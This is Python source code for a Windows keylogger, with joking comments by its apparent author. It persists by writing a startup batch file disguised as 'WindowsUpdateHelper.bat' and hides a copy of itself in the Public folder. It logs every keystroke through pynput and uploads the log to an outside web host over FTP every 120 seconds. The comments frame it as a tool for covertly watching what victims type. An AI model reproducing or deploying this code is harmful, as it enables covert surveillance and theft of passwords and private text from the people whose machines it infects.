import ftplib
import os
import threading
import getpass

#just getting things out of the box

def add_startup():
    USER_NAME = getpass.getuser() #prompts a user for a password w/o echo on a terminal
    
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME #the path where this keylogger shall reside in all its glory. r is for read.
    #since it is in the startup, it'll be pretty difficult to find. We'll make this more tough as we code
    
    with open(bat_path + '\\' + "WindowsUpdateHelper.bat", "w+") as bat_file: #disguise this as windows update helper and open the file then immediately close it.

        bat_file.write(r'start C:\Users\Public\keylogger.exe' ) #requesting computer-chan to open this file when windows starts

    os.system('copy keylogger.exe C:\\Users\\Public') #here we use a little bit of c programming-thingy to copy keylogger in public folder so people think the keylogger is no more after they delete it from public

    if(os.path.exists(r"C:\Users\Public\new.txt")): #again some c-thingy to create a new.txt text file where all our logs will be stored.

        print("Hello") #the new.txt should normally begin with a Hello if bat is properly executed in above path.
    else:
        print("DONE") #response if the keylogger doesn't find the path above.

        f= open(r"C:\Users\Public\new.txt","w") #r means read and w means write. this would execute as an immediate read write.
        f.close()
        #immediately open and close so the user doesn't notice a terminal being opened.
        

def server_upload(): #now here you need a free web hosting site. i preferred to use scienceontheweb.net.
    
    threading.Timer(120, server_upload).start() #keylogger sends back data every 120 seconds. in practice, too fast would bring incorrect data.
    
    session = ftplib.FTP('url','host id','password') #create a session
    
    session.cwd('url/subfolder') #what folder you want the data to be stored on in the web hosting site.
    
    file = open('new.txt','rb') #open the file and also read binary numbers. i just wrote that rb in case someone wants to communicate in binary.
    
    session.storbinary('STOR logs.txt', file) #sending our file over ftp.
    
    file.close()                                   
    session.quit()
    print("upload Success")
    #self explanatory

from pynput import keyboard #we need a keyboard. duh.

def on_pressz(key):
    try: #i used try in case any error should occur.
        
        keypress_log = open('new.txt','a')
        keypress_log.write(key.char)
        print(key.char)
        keypress_log.close()
        #any person too dumb to understand this should close this tab right now. seriously, go back. i've already explained this.
        
    except AttributeError: #the try kinda looks to omit errors and tries to run the program. doesnot omit attribute error cause if it did the program wouldn't run lol
        keypress_log = open('new.txt','a')
        
        if key == keyboard.Key.space: #telling computer-chan what it should do if the user wants to put in some spaces.
            keypress_log.write(' ')
            
        if key == keyboard.Key.enter: #telling your dumb machine what to do for enter.
            keypress_log.write('\n')  #make a new line should enter be pressed.
            
        print('special key {0} pressed'.format(key)) #this is here so we get whatever special key the user pressed. and {0} so we get them in order.
        
        keypress_log.close()
        
def on_release(key):
    print('key released')

add_startup() #start the server
server_upload() #upload
with keyboard.Listener(on_press=on_pressz,on_release=on_release) as listener: #lets see what they're typing
    listener.join() #let the users who have copies of new.txt also see what they're typing
